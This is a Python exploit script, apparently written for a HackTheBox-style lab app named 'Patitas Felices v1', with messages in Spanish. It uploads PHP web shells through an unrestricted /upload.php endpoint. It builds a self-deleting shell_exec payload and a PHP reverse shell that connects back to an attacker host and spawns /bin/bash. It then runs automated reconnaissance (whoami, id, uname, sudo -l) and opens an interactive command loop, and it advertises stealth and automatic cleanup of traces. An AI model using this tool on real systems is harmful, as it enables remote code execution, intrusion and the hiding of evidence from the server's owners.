#!/usr/bin/env python3
from __future__ import annotations
import argparse, sys, random, string, requests

def rname(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def oneshot(cmd: str) -> str:
    c = cmd.replace("\\", "\\\\").replace("'", "\\'")
    return f"<?php echo shell_exec('{c}'); unlink(__FILE__); ?>"

def reverse(lhost: str, lport: int) -> str:
    return (
        "<?php\n"
        f"$s=fsockopen('{lhost}',{lport});\n"
        "if(!$s)die('fail');\n"
        "$p=proc_open('/bin/bash',[['pipe','r'],['pipe','w'],['pipe','w']],$pipes);\n"
        "if(is_resource($p)){\n"
        "  stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);\n"
        "  stream_set_blocking($pipes[2],0);stream_set_blocking($s,0);\n"
        "  while(!feof($s)){\n"
        "    $r=[$s,$pipes[1],$pipes[2]];$w=null;$e=null;\n"
        "    if(!stream_select($r,$w,$e,null))break;\n"
        "    if(in_array($s,$r)){$i=fread($s,8192);if($i===false)break;fwrite($pipes[0],$i);}\n"
        "    if(in_array($pipes[1],$r)){$o=fread($pipes[1],8192);if($o===false)break;fwrite($s,$o);}\n"
        "    if(in_array($pipes[2],$r)){$o=fread($pipes[2],8192);if($o===false)break;fwrite($s,$o);}\n"
        "  }\n"
        "  fclose($s);foreach($pipes as $x)fclose($x);proc_close($p);\n"
        "}\n"
        "unlink(__FILE__);\n" 
    )

def upload(base: str, code: str, custom_name: str = None):
    name = custom_name or f"hist_{rname()}.php"
    try:
        r = requests.post(
            base.rstrip("/") + "/upload.php",
            files={"file": (name, code, "application/octet-stream")},
            timeout=15,
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Error de conexión en la subida: {e}")
        return None

    if r.status_code != 200:
        print(f"[-] HTTP Error: {r.status_code}")
        return None
    try:
        data = r.json()
    except Exception:
        print("[-] La respuesta no es un JSON válido.")
        return None
    
    if not data.get("ok"):
        print(f"[-] Error del servidor: {data}")
        return None
        
    path = data.get("path") or f"uploads/{name}"
    return path

def execute_command(base: str, filename: str, cmd: str) -> str:
    """Sube el payload con auto-destrucción, ejecuta la petición GET y deja el servidor limpio."""
    try:
        payload = oneshot(cmd)
        path = upload(base, payload, custom_name=filename)
        if not path:
            return "[-] Error al re-subir el payload para el comando."
        
        r = requests.get(f"{base}/{path}", timeout=15)
        return r.text.strip()
    except Exception as e:
        return f"[-] Error ejecutando comando: {e}"

def run_automated_triage(base: str, filename: str):
    """Ejecuta el bloque de reconocimiento automático inicial (Triage)."""
    print("\n" + "=" * 56)
    print(" [*] Ejecutando Reconocimiento Automático Inicial (Triage)...")
    print("=" * 56)
    
    triage_tasks = {
        "Usuario actual (whoami)": "whoami",
        "Identificación de privilegios (id)": "id",
        "Nombre de la máquina (hostname)": "hostname",
        "Versión del Kernel (uname -a)": "uname -a",
        "Permisos Sudo (sudo -n -l)": "sudo -n -l 2>/dev/null || echo 'No disponible o requiere contraseña'"
    }

    for description, cmd in triage_tasks.items():
        print(f"\n[+] {description}:")
        output = execute_command(base, filename, cmd)
        print("-" * 56)
        print(output if output else "(Sin salida)")
        print("-" * 56)

def main():
    p = argparse.ArgumentParser(description="Patitas Felices v1 upload RCE (Stealth & Cleanup)")
    p.add_argument("--url", help="URL base del objetivo (ej: http://10.10.10.X)")
    p.add_argument("--host", help="IP o dominio del objetivo")
    p.add_argument("--port", type=int, help="Puerto del objetivo")
    p.add_argument("--cmd", default="id", help="Comando inicial a ejecutar")
    p.add_argument("--lhost", help="IP local para Reverse Shell")
    p.add_argument("--lport", type=int, help="Puerto local para Reverse Shell")
    a = p.parse_args()

    if a.url:
        base = a.url.rstrip("/")
    elif a.host:
        port = a.port or 80
        base = f"{'https' if port == 443 else 'http'}://{a.host}:{port}"
    else:
        print("[-] Error: Debes especificar --url o --host"); sys.exit(1)

    print("=" * 56)
    print(" Patitas Felices v1 · Stealth RCE & Auto-Cleanup")
    print("=" * 56)
    print(f" Target: {base}")

    session_filename = f"hist_{rname()}.php"

    if a.lhost and a.lport:
        print(f" Mode  : Reverse Shell -> {a.lhost}:{a.lport}")
        path = upload(base, reverse(a.lhost, a.lport), custom_name=session_filename)
        if not path:
            sys.exit(1)
        try:
            requests.get(f"{base}/{path}", timeout=4)
        except Exception:
            pass
        print("[*] Trigger enviado. El archivo se auto-destruirá al cerrar la sesión.")
        print("=" * 56)
        return

    run_automated_triage(base, session_filename)

    print("\n[+] Entrando en modo interactivo sigiloso. Escribe 'exit' o 'quit' para salir.")
    print("=" * 56)
    
    while True:
        try:
            cmd = input("htb-stealth> ").strip()
            if not cmd:
                continue
            if cmd.lower() in ["exit", "quit"]:
                print("[*] Saliendo... Entorno limpio.")
                break
            
            output = execute_command(base, session_filename, cmd)
            print(output if output else "(empty)")
            print()
        except KeyboardInterrupt:
            print("\n[*] Saliendo...")
            break

    print("=" * 56)

if __name__ == "__main__":
    main()
